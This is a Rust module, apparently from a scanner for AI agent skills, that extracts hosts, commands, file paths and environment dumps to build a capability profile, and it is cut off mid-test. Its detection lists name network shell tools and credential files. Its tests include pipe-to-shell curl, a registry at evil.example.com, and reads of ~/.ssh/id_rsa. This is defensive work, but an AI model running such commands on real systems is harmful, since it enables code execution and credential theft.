//! Capability derivation.
//!
//! Turns findings and raw code text into a normalized [`Capability`] set, and
//! extracts the shared tokens (URLs, hosts, commands, paths) that both the
//! rules and the capability diff need.
//!
//! Design rule that makes the diff usable (docs/MVP.md §4): **only executable
//! artifacts count as observed capability**. A URL in prose is documentation.
//! Markdown references to `~/.ssh` are explanation; `~/.ssh` in `scripts/` is
//! an access. Getting this wrong is what would sink the diff's precision.

use crate::models::Capability;
use regex::Regex;
use std::collections::BTreeSet;
use std::sync::OnceLock;

/// Compile a regex that is a compile-time constant of this crate.
///
/// A malformed pattern here is a bug in the binary, not hostile input, so it
/// panics at first use rather than degrading silently.
#[allow(clippy::panic)]
fn re(pattern: &str) -> Regex {
    Regex::new(pattern).unwrap_or_else(|e| panic!("built-in regex is invalid: {pattern}: {e}"))
}

fn url_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| re(r#"(?i)\b(?:https?|ftps?)://[^\s'"`)\]}<>]+"#))
}

fn domain_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r#"(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|dev|app|ai|co|sh|cn|ru|xyz|top|info|me|cloud|site|online|live|gg|tv|so|cc|to)\b"#)
    })
}

fn bare_host_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        re(r"(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|dev|app|ai|co|sh|cn|ru|xyz|top|info|me|cloud|site|online|live|gg|tv|so|cc|to)\b")
    })
}

/// TLDs that collide with file extensions and English words.
///
/// A bare `word.tld` with one of these is only a host in *network context*,
/// mirroring `NET_DOMAIN_LITERAL`. Without this, a script the skill names
/// (`/tmp/build-output/run.sh`) was recorded as an observed outbound host, so a
/// skill with no network code became a declared-vs-observed `network` violation
/// — a false accusation that blocks (rev 24). `com`/`net`/`org` stay out of the
/// list because they are not file extensions.
const AMBIGUOUS_TLDS: &[&str] = &[
    ".sh", ".app", ".info", ".dev", ".ai", ".io", ".co", ".me", ".so", ".cc", ".to", ".tv", ".gg",
    ".live", ".site", ".online", ".cloud",
];

/// Commands that mean the text is about the network, so a bare ambiguous-TLD
/// host near one of them is a real endpoint rather than a filename.
const NETWORK_COMMANDS: &[&str] = &[
    "curl", "wget", "ssh", "scp", "sftp", "rsync", "nc", "ncat", "netcat", "telnet", "ping",
    "nslookup", "dig", "ftp", "host", "getent",
];

fn has_network_context(text: &str) -> bool {
    let t = text.to_ascii_lowercase();
    t.contains("://")
        || t.contains("www.")
        || t.contains('@')
        || invoked_commands(text)
            .iter()
            .any(|c| NETWORK_COMMANDS.contains(&c.as_str()))
}

/// Commands that mean "this runs something" or "this reaches the network".
pub const SHELL_BINARIES: &[&str] = &[
    "bash",
    "sh",
    "zsh",
    "ksh",
    "dash",
    "eval",
    "exec",
    "sudo",
    "su",
    "doas",
    "curl",
    "wget",
    "chmod",
    "chown",
    "rm",
    "cp",
    "mv",
    "dd",
    "mkfs",
    "shred",
    "truncate",
    "nc",
    "ncat",
    "netcat",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "git",
    "python",
    "python3",
    "pip",
    "pip3",
    "node",
    "npm",
    "npx",
    "pnpm",
    "yarn",
    "deno",
    "bun",
    "ruby",
    "perl",
    "php",
    "go",
    "cargo",
    "java",
    "javac",
    "powershell",
    "pwsh",
    "cmd",
    "osascript",
    "open",
    "env",
    "printenv",
    "systemctl",
    "crontab",
    "kill",
    "killall",
    "launchctl",
    "docker",
    "kubectl",
    "aws",
    "gcloud",
    "az",
    "terraform",
];

/// Package managers, tracked separately from generic execution because
/// `npm install` from a non-default registry is its own threat.
pub const PACKAGE_MANAGERS: &[&str] = &[
    "npm", "pnpm", "yarn", "bun", "pip", "pip3", "poetry", "uv", "cargo", "go", "gem", "composer",
];

/// Paths whose access is a credential-access signal.
pub const SENSITIVE_PATH_PATTERNS: &[&str] = &[
    r"\.ssh(/|$|\b)",
    r"\.aws(/|$|\b)",
    r"\.gnupg(/|$|\b)",
    r"\.kube(/|$|\b)",
    r"\.docker/config\.json",
    r"\.git-credentials",
    r"\.netrc",
    r"\.npmrc",
    r"\.pypirc",
    r"\.env(\b|$|\.)",
    r"/etc/passwd",
    r"/etc/shadow",
    r"credentials(\.json|\.yml|\.yaml)?\b",
    r"id_rsa",
    r"id_ed25519",
    r"\.config/gcloud",
    r"keychain",
    r"Library/Keychains",
    r"\.claude/settings\.json",
    r"\.claude\.credentials",
];

fn sensitive_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        let alts: Vec<String> = SENSITIVE_PATH_PATTERNS
            .iter()
            .map(|p| format!("(?i){p}"))
            .collect();
        re(&format!("(?:{})", alts.join("|")))
    })
}

pub fn is_sensitive_path(s: &str) -> bool {
    sensitive_re().is_match(s) && !only_env_templates(s)
}

/// Are the `.env` files this text names all *templates*?
///
/// `.env.example`, `.env.sample`, `.env.template` and `.env.dist` are committed
/// on purpose *because* they hold no secrets, and `cat .env.example` is how a
/// skill bootstraps. Treating them as a key store made a skill that only copies
/// the template read as `secrets.read` (rev 28). A bare `.env` or `.env.local`
/// in the same text still counts.
fn only_env_templates(text: &str) -> bool {
    const TEMPLATES: &[&str] = &[
        ".env.example",
        ".env.sample",
        ".env.template",
        ".env.dist",
        ".env.defaults",
    ];
    let lower = text.to_ascii_lowercase();
    if !TEMPLATES.iter().any(|t| lower.contains(t)) {
        return false;
    }
    let stripped = TEMPLATES.iter().fold(lower, |acc, t| acc.replace(t, ""));
    !bare_env_re().is_match(&stripped)
}

fn bare_env_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| re(r"(?i)\.env(\b|$)"))
}

/// Extract URLs and reduce them to hosts.
pub fn outbound_hosts(text: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for m in url_re().find_iter(text) {
        let raw = m.as_str();
        if let Some(host) = host_of(raw) {
            out.insert(host);
        }
    }
    // Bare hostnames (curl example.com, --host example.com).
    for m in domain_re().find_iter(text) {
        let h = m.as_str().to_ascii_lowercase();
        if out.contains(&h) {
            continue;
        }
        // A path component is not a host: `/tmp/build/run.sh`, `dir/foo.io`.
        let before = &text[..m.start()];
        let in_path = before.ends_with('/') || before.ends_with('\\');
        let ambiguous = AMBIGUOUS_TLDS.iter().any(|t| h.ends_with(t));
        if in_path || (ambiguous && !has_network_context(text)) {
            continue;
        }
        out.insert(h);
    }
    out
}

fn host_of(url: &str) -> Option<String> {
    let rest = url.split_once("://").map(|(_, r)| r).unwrap_or(url);
    let authority = rest
        .split(['/', '?', '#'])
        .next()
        .unwrap_or("")
        .rsplit('@')
        .next()
        .unwrap_or("");
    if authority.is_empty() {
        return None;
    }
    // Strip a port, keep IPv6 brackets intact.
    let host = if let Some(bracket_end) = authority.find(']') {
        &authority[..=bracket_end]
    } else {
        authority.split(':').next().unwrap_or("")
    };
    let h = host.to_ascii_lowercase();
    if h.is_empty() {
        None
    } else {
        Some(h)
    }
}

/// Commands invoked on a line. Handles `sudo -E bash`, `| sh`, `&& curl`.
pub fn invoked_commands(line: &str) -> BTreeSet<String> {
    let mut out = BTreeSet::new();
    for tok in tokenize_shell(line) {
        let base = tok.rsplit('/').next().unwrap_or(&tok).to_ascii_lowercase();
        if SHELL_BINARIES.contains(&base.as_str()) || PACKAGE_MANAGERS.contains(&base.as_str()) {
            out.insert(base);
        }
    }
    out
}

/// Split a line into candidate command tokens: split on shell separators, then
/// take the first word of each segment. Deliberately approximate — it is a
/// heuristic for capability *hints*, and every hit carries evidence.
fn tokenize_shell(line: &str) -> Vec<String> {
    let mut out = Vec::new();
    for seg in split_shell_segments(line) {
        let seg = seg.trim_start_matches(['(', '{', '[']);
        let mut words = seg.split_whitespace();
        let Some(first) = words.next() else { continue };
        let first = first.trim_matches(|c: char| {
            !c.is_ascii_alphanumeric() && c != '-' && c != '.' && c != '_' && c != '/'
        });
        if !first.is_empty() {
            out.push(first.to_owned());
        }
        // `sudo -E rm -rf /`: also record the command after sudo.
        if SHELL_BINARIES.contains(&first.to_ascii_lowercase().as_str()) {
            for w in words.take(3) {
                let w = w.trim_matches(|c: char| {
                    !c.is_ascii_alphanumeric() && c != '-' && c != '.' && c != '_'
                });
                if SHELL_BINARIES.contains(&w.to_ascii_lowercase().as_str()) {
                    out.push(w.to_owned());
                }
            }
        }
    }
    out
}

fn split_shell_segments(line: &str) -> Vec<&str> {
    let mut out = Vec::new();
    let mut start = 0usize;
    let bytes = line.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        // Advance by whole characters. Stepping a byte at a time put `i` inside
        // a multi-byte character, and `&line[start..i]` then panicked — a real
        // skill containing a curly apostrophe (U+2019) was enough to trigger it
        // (invariant S7: no input may panic).
        let two = if i + 1 < bytes.len() {
            line.get(i..i + 2)
        } else {
            None
        };
        if matches!(two, Some("&&") | Some("||") | Some(";;") | Some("|&")) {
            out.push(&line[start..i]);
            i += 2;
            start = i;
            continue;
        }
        match bytes[i] {
            b';' | b'|' | b'\n' => {
                out.push(&line[start..i]);
                i += 1;
                start = i;
            }
            _ => i += utf8_char_len(bytes[i]),
        }
    }
    out.push(&line[start.min(line.len())..]);
    out
}

/// The length in bytes of the UTF-8 character starting with `b`.
///
/// Only the leading byte is needed, and an invalid lead is treated as one byte
/// so a malformed string still terminates instead of looping.
fn utf8_char_len(b: u8) -> usize {
    if b < 0x80 {
        1
    } else if b >> 5 == 0b110 {
        2
    } else if b >> 4 == 0b1110 {
        3
    } else if b >> 3 == 0b11110 {
        4
    } else {
        1
    }
}

/// Environment dumps: `printenv`, `env`, `os.environ`, `$ENV`, `process.env`
/// enumerated rather than read by key.
///
/// The distinction matters. `os.environ['HOME']` reads one variable;
/// `dict(os.environ)` hands every credential the agent holds to whatever comes
/// next. Conflating them is how a scanner loses its credibility.
pub fn dumps_environment(line: &str) -> bool {
    let l = line.to_lowercase();
    if l.contains("printenv") || l.contains("getenv()") {
        return true;
    }
    // `env | tee`, `set | grep`: enumerating into a pipe.
    if l.contains("env |") || l.contains("env|") {
        return true;
    }
    for sym in ["os.environ", "process.env"] {
        let mut from = 0usize;
        while let Some(i) = l[from..].find(sym) {
            let after = &l[from + i + sym.len()..];
            let enumerating = !after.starts_with('[')
                && !after.starts_with(".get")
                && !after.starts_with(".pop")
                && !after.starts_with(".copy()")
                && !(after.starts_with('.') && !after.starts_with(".items()"));
            if enumerating {
                return true;
            }
            from += i + sym.len();
        }
    }
    // Iteration and serialization always mean enumeration.
    l.contains(".items()") && (l.contains("os.environ") || l.contains("process.env"))
        || l.contains("object.keys(") && l.contains("process.env")
        || l.contains("json.stringify") && l.contains("process.env")
}

/// Whether a line reads the environment wholesale (used by capability diff).
pub fn reads_environment(line: &str) -> bool {
    dumps_environment(line)
}

/// Accumulate observed capabilities from an executable artifact's lines.
#[derive(Debug, Default)]
pub struct Accumulator {
    pub cap: Capability,
}

impl Accumulator {
    pub fn new() -> Self {
        Self::default()
    }

    /// Accumulate capabilities from one line of executable text.
    ///
    /// Returns notes for paths whose access mode could not be resolved. They are
    /// returned rather than swallowed because a wrong answer that looks like
    /// coverage is worse than an admitted unknown (issue #3): the caller turns
    /// each one into an `FS_MODE_UNRESOLVED` finding.
    pub fn add_text(&mut self, text: &str) -> Vec<String> {
        for h in outbound_hosts(text) {
            self.cap.network_outbound.push(h);
        }
        for c in invoked_commands(text) {
            if PACKAGE_MANAGERS.contains(&c.as_str()) {
                self.cap.package_install.push(c);
            } else {
                self.cap.shell_execute.push(c);
            }
        }
        if dumps_environment(text) {
            self.cap.secrets_read = true;
        }
        if is_sensitive_path(text) {
            self.cap.secrets_read = true;
        }
        self.collect_paths(text)
    }

    fn collect_paths(&mut self, text: &str) -> Vec<String> {
        // A shebang names the interpreter that runs the file, not a path the
        // skill reads. `#!/bin/sh` made a clean build script look like it read
        // `/bin/sh`, which the declared-vs-observed diff then treats as
        // undeclared filesystem access (rev 24).
        if text.starts_with("#!") {
            return Vec::new();
        }
        let mut reads = BTreeSet::new();
        let mut writes = BTreeSet::new();
        let mut notes = Vec::new();
        // URLs are masked out first, preserving length so offsets stay valid.
        // Otherwise the path regex reports `//cdn.example.net/install` as a
        // directory the skill reads.
        let masked = mask_urls(text);
        for m in path_re().find_iter(&masked) {
            let raw = m.as_str();
            let strong = normalize_path_token(raw);
            let (io, ctx) = classify_path(&masked, m.start());
            // A bare filename (`out.txt`) is too ambiguous to count on its own,
            // so it only counts when the surrounding call makes it a file: a
            // redirect, `tee`/`cat`, or an `open`-family call. `response.json()`
            // stays out, which is what keeps the diff honest.
            let p = if !strong.is_empty() {
                strong
            } else {
                match bare_file_token(raw) {
                    Some(b) if ctx != Ctx::None => b,
                    _ => continue,
                }
            };
            if ctx == Ctx::UnresolvedMode {
                // Read is the conservative default (a missed write becomes a
                // missing HIGH violation; a missed read is informational), but
                // it is not silent: the note forces a human to look.
                notes.push(format!(
                    "{p}: access mode could not be resolved statically; \
                     counted as a read, not a write"
                ));
                reads.insert(p);
            } else if io == Io::Write {
                writes.insert(p);
            } else {
                reads.insert(p);
            }
        }
        self.cap.filesystem_read.extend(reads);
        self.cap.filesystem_write.extend(writes);
        notes
    }

    pub fn finish(self) -> Capability {
        self.cap.normalized()
    }
}

fn path_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        // The last alternative catches separator-less dotfiles such as `.env`.
        // It also matches attribute accesses like `.json`; those are filtered
        // out downstream by `is_config_file`, which is why that check exists.
        re(
            r"(?:~|\.{1,2})?/?(?:[\w.\-]+/){0,6}[\w.\-]+(?:\.[A-Za-z0-9]{1,6})?|\$\{?[A-Z_]{3,}\}?|/[A-Za-z0-9._\-/]{3,}|\.[A-Za-z0-9_][A-Za-z0-9_.\-]{0,19}",
        )
    })
}

/// Replace every URL with dots of the same length, so byte offsets survive and
/// the path regex sees no URL at all.
fn mask_urls(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut last = 0usize;
    for m in url_re().find_iter(text) {
        out.push_str(&text[last..m.start()]);
        for _ in 0..m.len() {
            out.push('.');
        }
        last = m.end();
    }
    out.push_str(&text[last..]);
    out
}

fn normalize_path_token(t: &str) -> String {
    let t = t
        .trim()
        .trim_matches(['"', '\'', '`', ',', ';', ':', ')', '(', '[', ']', '{', '}']);
    if t.is_empty() {
        return String::new();
    }
    // A URL is a network path, not a filesystem path. Without this the path
    // regex reports `//host/install` as a directory the skill reads.
    if t.contains("://") {
        return String::new();
    }
    // Skip bare words and version-like tokens that the path regex over-matches.
    if !t.contains('/') && !t.starts_with('~') && !t.starts_with('$') && !is_config_file(t) {
        return String::new();
    }
    // A version is not a path. `Chrome/120.0.0.0`, `AppleWebKit/537.36` and
    // `Mozilla/5.0` end in a segment that is only digits and dots, and the path
    // regex reads them as directories under a browser name. Rejecting them costs
    // at most a missed *read* (informational), while keeping them produces a
    // false capability that feeds declared-vs-observed.
    if is_version_segment(t) {
        return String::new();
    }
    if t.matches('.').count() > 3 {
        return String::new();
    }
    if t.len() < 4 {
        return String::new();
    }
    t.replace('\\', "/")
}

/// True when a token's last `/`-separated segment is only digits and dots.
///
/// `120.0.0.0`, `537.36`, `5.0`. The token has to contain a dot, so a plain
/// number (`logs/2024`) is left alone.
fn is_version_segment(t: &str) -> bool {
    match t.rsplit('/').next() {
        Some(last) => last.contains('.') && last.chars().all(|c| c.is_ascii_digit() || c == '.'),
        None => false,
    }
}

/// Dotfiles that are genuinely paths.
///
/// A bare `.foo` token is ambiguous: in `response.json()` or `req.get(` the
/// path regex sees `.json` and `.get`, which are attribute accesses rather than
/// files. Reporting those as filesystem reads is how a capability diff loses all
/// credibility, so a separator-less token only counts when it is a known config
/// filename.
fn is_config_file(t: &str) -> bool {
    const CONFIG_FILES: &[&str] = &[
        ".env",
        ".envrc",
        ".ssh",
        ".aws",
        ".gnupg",
        ".kube",
        ".npmrc",
        ".netrc",
        ".pypirc",
        ".git-credentials",
        ".docker",
        ".config",
    ];
    CONFIG_FILES.contains(&t.to_ascii_lowercase().as_str())
}

// ── read vs write classification (issue #3) ───────────────────────────────
//
// The read/write split is not cosmetic: `policy.filesystem.write` is a HIGH
// violation while a read is MEDIUM, so a write misclassified as a read is a
// silently missed violation. The older check guessed from nearby text, which
// could not see a redirect (the `>` is *before* the path, and it looked after)
// and misfiled `open(p, mode)` when the mode was not a literal. This classifies
// from the call that takes the path, without a parser.

/// How a path token is used.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Io {
    Read,
    Write,
    /// A call the classifier recognises, but whose mode it cannot resolve
    /// (usually a variable). Never silently promoted to `Read`.
    Unknown,
}

/// What made the read/write call, so a bare filename can be accepted only when
/// the context really is a file operation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Ctx {
    /// A redirect, `tee`/`cat`, or a recognised file call.
    Definite,
    /// An `open`-family call whose mode could not be resolved.
    UnresolvedMode,
    /// Not a file context (an unrecognised call, or nothing).
    None,
}

fn classify_path(line: &str, start: usize) -> (Io, Ctx) {
    // A redirect is a write, wherever the file is opened.
    if is_redirect_target(line, start) {
        return (Io::Write, Ctx::Definite);
    }
    // `tee` writes its argument, and its argument is not on the right of `>`.
    if segment_runs(line, start, "tee") {
        return (Io::Write, Ctx::Definite);
    }
    // `cat in.txt`: an explicit read command makes a bare filename a path.
    if segment_runs(line, start, "cat") {
        return (Io::Read, Ctx::Definite);
    }
    // Otherwise the innermost enclosing call that takes this path decides. If a
    // call is recognised but its mode is unknown, keep looking outward, so
    // `open(os.path.join(dir, 'x'), 'w')` still resolves to a write.
    for (callee, args) in enclosing_calls(line, start) {
        let (io, unresolved) = classify_call(&callee, &args);
        match io {
            Io::Write => return (Io::Write, Ctx::Definite),
            Io::Read => return (Io::Read, Ctx::Definite),
            Io::Unknown if unresolved => return (Io::Read, Ctx::UnresolvedMode),
            Io::Unknown => {}
        }
    }
    // No recognised file context: `cat`/redirects absent and no known call.
    (Io::Read, Ctx::None)
}

/// A bare `name.ext` filename that is only a path when the context says so.
///
/// Deliberately excludes `.json`-style attribute access by requiring a
/// non-empty stem, and caps the extension so `sha256.abcdef...` is not a file.
fn bare_file_token(t: &str) -> Option<String> {
    let t = t.trim();
    if t.len() < 4 || t.len() > 128 {
        return None;
    }
    let (stem, ext) = t.rsplit_once('.')?;
    if stem.is_empty() || ext.is_empty() || ext.len() > 6 {
        return None;
    }
    if !ext.chars().all(|c| c.is_ascii_alphanumeric()) {
        return None;
    }
    if !stem
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
    {
        return None;
    }
    Some(t.to_owned())
}

/// `cmd > out.txt` and `cmd >> log.txt`: is `start` the target of a redirect?
fn is_redirect_target(line: &str, start: usize) -> bool {
    let b = line.as_bytes();
    let mut i = start;
    while i > 0 && (b[i - 1] == b' ' || b[i - 1] == b'\t') {
        i -= 1;
    }
    i > 0 && b[i - 1] == b'>'
}

/// Is `cmd` the command of the pipeline/statement segment that contains the
/// path at `start` (allowing a leading `sudo` / `doas` / `env`)?
fn segment_runs(line: &str, start: usize, cmd: &str) -> bool {
    let b = line.as_bytes();
    let mut seg_start = 0usize;
    let mut i = start;
    while i > 0 {
        i -= 1;
        if matches!(b[i], b'\n' | b';' | b'|' | b'&' | b'(') {
            seg_start = i + 1;
            break;
        }
    }
    let seg = line.get(seg_start..start).unwrap_or("");
    let mut tokens = seg.split_whitespace();
    let mut first = tokens.next().unwrap_or("");
    if matches!(first, "sudo" | "doas" | "env") {
        first = tokens.next().unwrap_or("");
    }
    first == cmd
}

/// Enclosing calls of the position `start`, innermost first.
///
/// Bounded: at most one line and a few hundred bytes, no AST. Each entry is
/// `(callee, raw_argument_text)`.
fn enclosing_calls(line: &str, start: usize) -> Vec<(String, String)> {
    let b = line.as_bytes();
    let mut calls = Vec::new();
    let mut depth: i32 = 0;
    let mut i = start;
    let mut steps = 0usize;
    while i > 0 {
        i -= 1;
        steps += 1;
        if steps > 4000 {
            break;
        }
        match b[i] {
            b')' | b']' | b'}' => depth += 1,
            b'(' | b'[' | b'{' => {
                if depth > 0 {
                    depth -= 1;
                } else if b[i] == b'(' {
                    if let Some(close) = matching_close(line, i) {
                        if close > start {
                            calls.push((callee_before(line, i), line[i + 1..close].to_owned()));
                        }
                    }
                }
            }
            b'\n' | b';' if depth == 0 => break,
            _ => {}
        }
    }
    calls
}

/// The index of the close bracket matching the open one at `open`, skipping
/// brackets and quotes inside string literals.
fn matching_close(line: &str, open: usize) -> Option<usize> {
    let b = line.as_bytes();
    let mut depth: i32 = 0;
    let mut quote: Option<u8> = None;
    let mut i = open;
    while i < b.len() {
        let c = b[i];
        match quote {
            Some(q) => {
                if c == b'\\' {
                    i += 2;
                    continue;
                }
                if c == q {
                    quote = None;
                }
            }
            None => match c {
                b'\'' | b'"' | b'`' => quote = Some(c),
                b'(' | b'[' | b'{' => depth += 1,
                b')' | b']' | b'}' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(i);
                    }
                }
                _ => {}
            },
        }
        i += 1;
    }
    None
}

/// The identifier immediately before an opening paren, e.g. `open` or
/// `os.path.join` in `open(` / `os.path.join(`.
fn callee_before(line: &str, paren: usize) -> String {
    let b = line.as_bytes();
    let mut i = paren;
    while i > 0 && (b[i - 1] == b' ' || b[i - 1] == b'\t') {
        i -= 1;
    }
    let end = i;
    while i > 0 {
        let c = b[i - 1];
        if c.is_ascii_alphanumeric() || c == b'_' || c == b'.' || c == b'$' {
            i -= 1;
        } else {
            break;
        }
    }
    line.get(i..end).unwrap_or("").to_owned()
}

fn classify_call(callee: &str, args: &str) -> (Io, bool) {
    let lowered = callee.to_ascii_lowercase();
    let base = lowered.rsplit('.').next().unwrap_or(lowered.as_str());
    match base {
        // Python file objects, Node, Go, Rust.
        "write_text" | "write_bytes" | "writelines" | "writeln" | "writefile" | "writefilesync"
        | "writefileutf8" | "createwritestream" | "write" => return (Io::Write, false),
        "create" => return (Io::Write, false), // Go's os.Create
        "open" | "openfile" | "fopen" => {
            let io = mode_of(args);
            // An unresolved mode is the one case the caller must report.
            return (io, io == Io::Unknown);
        }
        // Explicit readers, so an outer writer cannot override a clear read.
        "read_text" | "read_bytes" | "read_to_string" | "readlines" | "readfile"
        | "readfilesync" | "readtoend" => return (Io::Read, false),
        _ => {}
    }
    (Io::Unknown, false)
}

/// The mode of an `open`-family call, from its second argument.
fn mode_of(args: &str) -> Io {
    let parts = split_top_level_args(args);
    if parts.len() < 2 {
        // Python's default mode is read; `open(path)` cannot be a write.
        return Io::Read;
    }
    let second = parts[1].trim();
    if let Some(mode) = string_literal(second) {
        // `r`, `rb`, `rt`, `r+` are reads; `w`, `a`, `x` (and their `+`/`b`
        // variants) are writes.
        return if mode.chars().any(|c| matches!(c, 'w' | 'a' | 'x')) {
            Io::Write
        } else {
            Io::Read
        };
    }
    // A Go flag expression is not a literal but is still decidable.
    if second.contains("O_WRONLY")
        || second.contains("O_RDWR")
        || second.contains("O_CREATE")
        || second.contains("O_TRUNC")
        || second.contains("O_APPEND")
    {
        return Io::Write;
    }
    // A variable. Do not guess.
    Io::Unknown
}

/// The contents of `s` if it is a single quoted string literal.
fn string_literal(s: &str) -> Option<&str> {
    let bytes = s.as_bytes();
    let q = *bytes.first()?;
    if matches!(q, b'\'' | b'"' | b'`') && bytes.len() >= 2 && bytes[bytes.len() - 1] == q {
        return s.get(1..s.len() - 1);
    }
    None
}

/// Split a raw argument list on top-level commas, respecting quotes and
/// nesting. A bounded scan, not a parser.
fn split_top_level_args(args: &str) -> Vec<&str> {
    let b = args.as_bytes();
    let mut out = Vec::new();
    let mut depth: i32 = 0;
    let mut quote: Option<u8> = None;
    let mut start = 0usize;
    let mut i = 0usize;
    while i < b.len() {
        let c = b[i];
        match quote {
            Some(q) => {
                if c == b'\\' {
                    i += 2;
                    continue;
                }
                if c == q {
                    quote = None;
                }
            }
            None => match c {
                b'\'' | b'"' | b'`' => quote = Some(c),
                b'(' | b'[' | b'{' => depth += 1,
                b')' | b']' | b'}' => depth -= 1,
                b',' if depth == 0 => {
                    out.push(args.get(start..i).unwrap_or(""));
                    start = i + 1;
                }
                _ => {}
            },
        }
        i += 1;
    }
    out.push(args.get(start..).unwrap_or(""));
    out
}

/// Hosts a line contacts, for the declared-vs-observed diff.
pub fn hosts_in(line: &str) -> Vec<String> {
    outbound_hosts(line).into_iter().collect()
}

/// Bare hostnames only, excluding ones that appear as part of a URL.
pub fn bare_hosts(line: &str) -> Vec<String> {
    let url_spans: Vec<(usize, usize)> = url_re()
        .find_iter(line)
        .map(|m| (m.start(), m.end()))
        .collect();
    let mut out = BTreeSet::new();
    for m in bare_host_re().find_iter(line) {
        if url_spans
            .iter()
            .any(|(s, e)| m.start() >= *s && m.end() <= *e)
        {
            continue;
        }
        out.insert(m.as_str().to_ascii_lowercase());
    }
    out.into_iter().collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_hosts_from_urls() {
        let h = outbound_hosts("curl https://api.example.com/v1?x=1 and http://Evil.EXAMPLE.org/y");
        assert!(h.contains("api.example.com"));
        assert!(h.contains("evil.example.org"), "{h:?}");
    }

    #[test]
    fn strips_credentials_and_port_from_url() {
        let h = outbound_hosts("https://user:pw@internal.example.com:8443/path");
        assert!(h.contains("internal.example.com"), "{h:?}");
        assert!(!h.iter().any(|x| x.contains('@')));
    }

    #[test]
    fn finds_bare_hostnames() {
        let h = outbound_hosts("ping example.com -c 1");
        assert!(h.contains("example.com"));
    }

    #[test]
    fn bare_hosts_excludes_url_embedded_hosts() {
        let v = bare_hosts("curl https://a.example.com/x");
        assert!(v.is_empty(), "{v:?}");
        let v2 = bare_hosts("nslookup b.example.com");
        assert_eq!(v2, vec!["b.example.com".to_owned()]);
    }

    #[test]
    fn a_filename_is_not_a_host() {
        // `/tmp/build-output/run.sh` is a path component, and `.sh` is a
        // file extension before it is a TLD. Neither is an outbound host.
        assert!(outbound_hosts("chmod +x /tmp/build-output/run.sh").is_empty());
        assert!(outbound_hosts("cat dir/foo.io").is_empty());
        // Ambiguous TLDs still count with network context.
        assert!(outbound_hosts("curl example.sh").contains("example.sh"));
        assert!(outbound_hosts("nc example.co 443").contains("example.co"));
        // A non-ambiguous TLD is a host with or without a command.
        assert!(outbound_hosts("example.com").contains("example.com"));
    }

    #[test]
    fn detects_commands_across_segments() {
        let c = invoked_commands("sudo -E curl https://x.example.com | bash");
        assert!(c.contains("sudo"));
        assert!(c.contains("curl"));
        assert!(c.contains("bash"));
    }

    #[test]
    fn ignores_non_commands() {
        let c = invoked_commands("this is prose about how to use the tool");
        assert!(!c.contains("bash"));
        assert!(!c.contains("sudo"));
    }

    #[test]
    fn separates_package_managers() {
        let mut a = Accumulator::new();
        a.add_text("npm install --registry=https://evil.example.com pkg");
        let cap = a.finish();
        assert!(cap.package_install.contains(&"npm".to_owned()));
        assert!(cap
            .network_outbound
            .contains(&"evil.example.com".to_owned()));
    }

    #[test]
    fn detects_environment_dumps() {
        assert!(dumps_environment("printenv"));
        assert!(dumps_environment("env | grep TOKEN"));
        assert!(dumps_environment("os.environ"));
        assert!(dumps_environment("for k, v in process.env.items()"));
        assert!(!dumps_environment("os.environ['HOME']"));
        assert!(!dumps_environment("environment variable documentation"));
    }

    #[test]
    fn detects_sensitive_paths() {
        assert!(is_sensitive_path("cat ~/.ssh/id_rsa"));
        assert!(is_sensitive_path("cat .env"));
        assert!(is_sensitive_path("cat .env.local"));
        assert!(is_sensitive_path("open('/etc/passwd')"));
        // A committed template holds no secrets, but a real `.env` beside it
        // does (rev 28).
        assert!(!is_sensitive_path("cat .env.example"));
        assert!(!is_sensitive_path("open('.env.example')"));
        assert!(is_sensitive_path("cat .env.example .env"));
        assert!(!is_sensitive_path("./data/report.csv"));
        assert!(!is_sensitive_path("src/index.ts"));
    }

    #[test]
    fn capability_is_order_independent() {
        let mut a = Accumulator::new();
        a.add_text("curl https://b.example.com");
        a.add_text("curl https://a.example.com");
        let cap = a.finish();
        assert_eq!(cap.network_outbound, vec!["a.example.com", "b.example.com"]);
    }

    #[test]
    fn urls_are_not_reported_as_filesystem_paths() {
        let mut a = Accumulator::new();
        a.add_text("curl -o /tmp/x https://cdn.example.net/install");
        let cap = a.finish();
        assert!(
            !cap.filesystem_read
                .iter()
                .any(|p| p.contains("cdn.example.net")),
            "a URL must not appear as a read path: {:#?}",
            cap.filesystem_read
        );
        assert!(cap.network_outbound.contains(&"cdn.example.net".to_owned()));
    }

    #[test]
    fn attribute_access_is_not_a_filesystem_path() {
        // `response.json()` and `req.get(` look like `.json` and `.get` to a
        // path regex. Reporting those as reads would poison the capability diff.
        let mut a = Accumulator::new();
        a.add_text("response = requests.get(url)\nbody = response.json()");
        let cap = a.finish();
        assert!(
            cap.filesystem_read.is_empty(),
            "attribute access is not a path: {:#?}",
            cap.filesystem_read
        );
    }

    #[test]
    fn multibyte_characters_do_not_panic_the_shell_splitter() {
        // A real skill with a curly apostrophe (U+2019) panicked here: the
        // splitter stepped byte by byte, so a slice landed inside a character.
        // Invariant S7 says no input may panic, so this is the regression guard.
        let mut a = Accumulator::new();
        a.add_text("echo ‘quoted’ text; curl https://x.example.com | bash");
        a.add_text("don’t run this && echo done");
        a.add_text("日本語のテキスト; echo ok");
        let cap = a.finish();
        assert!(
            cap.network_outbound.contains(&"x.example.com".to_owned()),
            "{:#?}",
            cap.network_outbound
        );
        assert_eq!(split_shell_segments("a — b; c").len(), 2);
    }

    #[test]
